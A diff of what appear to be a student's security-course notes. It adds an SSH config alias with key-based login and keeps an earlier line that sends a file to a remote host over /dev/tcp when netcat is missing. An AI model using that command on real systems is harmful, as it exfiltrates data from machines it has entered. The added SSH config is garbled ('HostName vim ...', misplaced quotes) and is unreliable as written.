@@ -201,6 +201,29 @@ student18
          #if nc is not on box
          cat file.txt > /dev/tcp/10.2.0.2/1111
          ```
-         
      
+     
+     
+     
+     
+     
+     ##ssh tunneling alias
+     
+         ```
+         vim .ssh/config
+      ""   
+         Host ihost
+         HostName vim 10.50.38.54
+         User student
+         Port 2
+         ForwardX11 yes
+      ""
+        ssh-keygen -t ed25519
+        ssh-copy-id
+        vim .bash_aliases
+        alias ihost='ssh ihost terminator&'
+        ihost
+        
+        ```
+
 
